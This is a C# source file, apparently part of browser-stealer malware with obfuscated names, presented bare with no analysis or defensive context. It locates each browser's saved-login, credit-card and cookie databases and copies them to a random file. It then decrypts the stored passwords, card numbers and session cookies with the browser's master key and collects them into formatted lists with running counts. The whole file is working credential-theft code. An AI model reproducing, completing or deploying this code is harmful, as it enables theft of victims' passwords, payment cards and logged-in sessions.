using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using sexas;

namespace hostik;

public class BIR
{
	public class Login_Collect
	{
		public List<string> logins = new List<string>();

		public static List<Login_Collect> coo_s = new List<Login_Collect>();

		public string browser { get; set; }
	}

	public class Card_Collect
	{
		public List<string> Cards = new List<string>();

		public static List<Card_Collect> coo_s = new List<Card_Collect>();

		public string browser { get; set; }
	}

	public class Coockies_Collect
	{
		public List<string> Coockies = new List<string>();

		public static List<Coockies_Collect> coo_s = new List<Coockies_Collect>();

		public string browser { get; set; }
	}

	private BL browserList = new BL();

	public static int pass;

	public static int CC;

	public static int Coci;

	public int GetLogins()
	{
		int num = 0;
		if (browserList.Browsers != null && browserList.Browsers.Count != 0)
		{
			foreach (BI browser in browserList.Browsers)
			{
				if (!(string.IsNullOrEmpty(browser.LoginsPath) | !File.Exists(browser.LoginsPath)))
				{
					byte[] array = DE._getKey(browser.KeyPath);
					if (array != null)
					{
						List<string> list = new List<string>();
						string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Path.GetRandomFileName();
						File.Copy(browser.LoginsPath, text);
						Sqlite sqlite = new Sqlite(text);
						if (sqlite.ReadTable("logins"))
						{
							int rowCount = sqlite.GetRowCount();
							for (int i = 0; i < rowCount; i++)
							{
								string value = sqlite.GetValue(i, "password_value");
								string text2 = DE._decryptWithKey(Encoding.Default.GetBytes(value), array, 3);
								list.Add("Website: " + sqlite.GetValue(i, "origin_url") + "\nLogin: " + sqlite.GetValue(i, "username_value") + "\nPassword: " + text2 + "\n\n");
								pass++;
							}
						}
						Login_Collect.coo_s.Add(new Login_Collect
						{
							browser = browser.Name,
							logins = list
						});
						num += list.Count;
					}
				}
			}
			return num;
		}
		throw new Exception();
	}

	public int GetCards()
	{
		int num = 0;
		if (browserList.Browsers != null && browserList.Browsers.Count != 0)
		{
			foreach (BI browser in browserList.Browsers)
			{
				if (!(string.IsNullOrEmpty(browser.CardsPath) | !File.Exists(browser.CardsPath)))
				{
					byte[] array = DE._getKey(browser.KeyPath);
					if (array != null)
					{
						List<string> list = new List<string>();
						string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Path.GetRandomFileName();
						File.Copy(browser.CardsPath, text);
						Sqlite sqlite = new Sqlite(text);
						if (sqlite.ReadTable("credit_cards"))
						{
							int rowCount = sqlite.GetRowCount();
							for (int i = 0; i < rowCount; i++)
							{
								CC++;
								string value = sqlite.GetValue(i, "name_on_card");
								string value2 = sqlite.GetValue(i, "expiration_month");
								string value3 = sqlite.GetValue(i, "expiration_year");
								string value4 = sqlite.GetValue(i, "card_number_encrypted");
								list.Add("OwnerName: " + value + "\nExpirationTime: " + value2 + ":" + value3 + "\nCardNumbers: " + DE._decryptWithKey(Encoding.Default.GetBytes(value4), array, 3) + "\n");
							}
						}
						Card_Collect.coo_s.Add(new Card_Collect
						{
							browser = browser.Name,
							Cards = list
						});
						num += list.Count;
					}
				}
			}
			return num;
		}
		throw new Exception();
	}

	public int GetCookies()
	{
		int num = 0;
		if (browserList.Browsers != null && browserList.Browsers.Count != 0)
		{
			foreach (BI browser in browserList.Browsers)
			{
				if (!string.IsNullOrEmpty(browser.CookiePath) && File.Exists(browser.CookiePath))
				{
					byte[] array = DE._getKey(browser.KeyPath);
					if (array != null)
					{
						List<string> list = new List<string>();
						string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Path.GetRandomFileName();
						File.Copy(browser.CookiePath, text);
						Sqlite sqlite = new Sqlite(text);
						if (sqlite.ReadTable("cookies"))
						{
							int rowCount = sqlite.GetRowCount();
							for (int i = 0; i < rowCount; i++)
							{
								string value = sqlite.GetValue(i, "host_key");
								string value2 = sqlite.GetValue(i, "name");
								string value3 = sqlite.GetValue(i, "path");
								bool flag = sqlite.GetValue(i, "is_secure") == "0";
								string value4 = sqlite.GetValue(i, "expires_utc");
								byte[] bytes = Encoding.Default.GetBytes(sqlite.GetValue(i, "encrypted_value"));
								if (bytes != null)
								{
									string text2 = DE._decryptWithKey(bytes, array, 3).ToString();
									bool flag2 = sqlite.GetValue(i, "is_httponly") == "0";
									string item = value + "\t" + flag2.ToString().ToUpper() + "\t" + value3 + "\t" + flag.ToString().ToUpper() + "\t" + value4 + "\t" + value2 + "\t" + text2 + "\n";
									list.Add(item);
									Coci++;
								}
							}
						}
						Coockies_Collect.coo_s.Add(new Coockies_Collect
						{
							browser = browser.Name,
							Coockies = list
						});
						num += list.Count;
					}
				}
			}
			return num;
		}
		throw new Exception();
	}
}
